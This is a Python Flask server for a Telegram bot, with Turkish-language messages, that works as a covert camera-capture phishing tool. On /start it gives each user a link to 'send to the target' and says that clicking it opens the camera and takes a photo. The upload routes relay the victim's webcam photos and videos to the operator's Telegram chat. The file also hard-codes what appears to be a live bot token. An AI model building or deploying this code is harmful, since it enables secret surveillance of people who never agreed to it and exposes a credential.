import os
import logging
import uuid
import base64
from io import BytesIO
from flask import Flask, request, send_from_directory
import requests

# ==================== CONFIG ====================
TOKEN = os.environ.get("BOT_TOKEN", "8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY")
API_URL = "https://api.telegram.org/bot" + TOKEN

RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_STATIC_URL")
if RAILWAY_DOMAIN:
    WEBHOOK_URL = "https://" + RAILWAY_DOMAIN
else:
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://your-app.up.railway.app")

PORT = int(os.environ.get("PORT", 5000))

user_tokens = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder="static")

# ==================== TELEGRAM API FUNCTIONS ====================
def send_message(chat_id, text, reply_markup=None):
    url = API_URL + "/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        logger.error("send_message error: " + str(e))

def send_photo(chat_id, photo_bytes, caption=""):
    url = API_URL + "/sendPhoto"
    files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
    data = {"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"}
    try:
        requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        logger.error("send_photo error: " + str(e))

def send_video(chat_id, video_bytes, caption=""):
    url = API_URL + "/sendVideo"
    files = {"video": ("video.webm", video_bytes, "video/webm")}
    data = {"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"}
    try:
        requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        logger.error("send_video error: " + str(e))

# ==================== ROUTES ====================
@app.route("/" + TOKEN, methods=["POST"])
def telegram_webhook():
    json_data = request.get_json()

    if "message" in json_data and "text" in json_data["message"]:
        chat_id = json_data["message"]["chat"]["id"]
        user_id = json_data["message"]["from"]["id"]
        username = json_data["message"]["from"].get("username", "Bilinmiyor")
        text = json_data["message"]["text"]

        if text == "/start":
            token = str(uuid.uuid4()).replace("-", "")[:16]
            user_tokens[token] = {
                "user_id": user_id,
                "username": username,
                "chat_id": chat_id
            }

            link = WEBHOOK_URL + "/c/" + token

            keyboard = {
                "inline_keyboard": [[{"text": "Linke Git", "url": link}]]
            }

            msg = "Merhaba @" + username + "!\n\nOzel Linkiniz:\n" + link + "\n\nBu linki hedefe gonderin. Hedef linke tiklayinca kamera acilir ve fotograf cekilir."

            send_message(chat_id, msg, reply_markup=keyboard)

    return "OK", 200

@app.route("/c/<token>")
def capture_page(token):
    if token not in user_tokens:
        return "<h1>Link gecersiz!</h1>", 404
    return send_from_directory("static", "capture.html")

@app.route("/upload/<token>", methods=["POST"])
def upload_photo(token):
    if token not in user_tokens:
        return {"error": "Invalid token"}, 403

    data = request.get_json()
    image_data = data.get("image", "")

    if not image_data:
        return {"error": "No image"}, 400

    user_info = user_tokens[token]
    chat_id = user_info["chat_id"]
    username = user_info["username"]

    try:
        image_bytes = base64.b64decode(image_data.split(",")[1])
    except:
        return {"error": "Invalid image"}, 400

    cap = "Yeni Fotograf!\n\nKullanici: @" + username + "\nToken: " + token

    send_photo(chat_id, BytesIO(image_bytes), cap)
    return {"success": True}, 200

@app.route("/upload_video/<token>", methods=["POST"])
def upload_video(token):
    if token not in user_tokens:
        return {"error": "Invalid token"}, 403

    video_file = request.files.get("video")
    if not video_file:
        return {"error": "No video"}, 400

    user_info = user_tokens[token]
    chat_id = user_info["chat_id"]
    username = user_info["username"]

    cap = "Yeni Video!\n\nKullanici: @" + username

    send_video(chat_id, video_file.read(), cap)
    return {"success": True}, 200

@app.route("/")
def home():
    return "Bot Aktif!"

# ==================== MAIN ====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
